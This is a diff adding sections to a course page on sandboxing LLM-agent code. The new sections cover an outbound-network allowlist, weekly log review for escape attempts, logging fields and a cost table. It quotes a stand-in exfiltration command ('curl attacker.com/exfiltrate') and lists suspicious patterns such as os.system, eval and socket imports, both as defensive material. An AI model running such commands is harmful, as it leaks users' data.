@@ -416,6 +416,80 @@ Cost: more complex to operate than Docker.</p>
 <p>Read-only root filesystem; writable tmpfs in /tmp; nothing persists across calls. Prevents LLM-emitted code from establishing footholds.</p>
 <h3>8.4 Sandbox warmup pools</h3>
 <p>Keep N sandboxes pre-spun. New invocation grabs from pool, eliminating spin-up latency. Trade: idle resource cost.</p>
+<h3>8.5 Allowlisting the agent&#39;s outbound network</h3>
+<p>Default-deny outbound; whitelist explicitly. Per Helix&#39;s CodeAct:</p>
+<pre><code>allowed_outbound:
+  - pubmed.ncbi.nlm.nih.gov:443     # for paper retrieval
+  - api.helix.internal:443          # for internal experiment DB
+  - pypi.org:443                    # for pip-install of common packages
+  - files.pythonhosted.org:443      # actual package downloads
+deny_all_else: true
+</code></pre>
+<p>Without this, LLM-emitted code can <code>curl attacker.com/exfiltrate</code> and leak data. Network egress is the #1 sandbox-escape vector.</p>
+<h3>8.6 Code review for sandbox-escape attempts</h3>
+<p>Periodically (weekly), sample logs of sandbox-executed code. Look for:</p>
+<ul>
+<li><code>subprocess</code>, <code>os.system</code>, <code>eval</code>, <code>exec</code> calls with untrusted input</li>
+<li><code>requests.get(URL)</code> where URL is data-derived</li>
+<li>File writes outside <code>/tmp</code></li>
+<li>Long-running loops (potential resource exhaustion)</li>
+<li>Unusual imports (<code>ctypes</code>, <code>socket</code>, <code>multiprocessing</code>)</li>
+</ul>
+<p>Flag suspicious patterns. Track over time: a steady increase in suspicious patterns suggests the agent is being prompted into adversarial behaviour.</p>
+<h3>8.7 Sandbox observability</h3>
+<p>Each sandbox execution logs:</p>
+<ul>
+<li>Code emitted by the LLM</li>
+<li>Stdout and stderr</li>
+<li>Exit code</li>
+<li>Wall-clock duration</li>
+<li>Peak memory</li>
+<li>Network attempts (allowed + denied)</li>
+<li>File operations</li>
+</ul>
+<p>This data feeds the safety dashboards (Module 10). Without it, you have no visibility into what your agents are actually executing.</p>
+<h3>8.8 Cost model for sandboxing</h3>
+<p>For Helix CodeAct: 1,000 sandbox invocations/day. Per-call cost:</p>
+<table>
+<thead>
+<tr>
+<th>Sandbox</th>
+<th>Compute $/call</th>
+<th>Storage $/call</th>
+<th>Total $/call</th>
+<th>Daily $</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Docker (own infra)</td>
+<td>$0.0001</td>
+<td>$0</td>
+<td>$0.0001</td>
+<td>$0.10</td>
+</tr>
+<tr>
+<td>gVisor (own infra)</td>
+<td>$0.0002</td>
+<td>$0</td>
+<td>$0.0002</td>
+<td>$0.20</td>
+</tr>
+<tr>
+<td>Firecracker (own infra)</td>
+<td>$0.0003</td>
+<td>$0</td>
+<td>$0.0003</td>
+<td>$0.30</td>
+</tr>
+<tr>
+<td>E2B (hosted)</td>
+<td>$0.003</td>
+<td>$0.0005</td>
+<td>$0.0035</td>
+<td>$3.50</td>
+</tr>
+</tbody></table>
+<p>For low volume: E2B&#39;s higher per-call cost is dwarfed by saved ops time. For high volume: self-hosted Firecracker wins.</p>
 
         </div>
       </section>
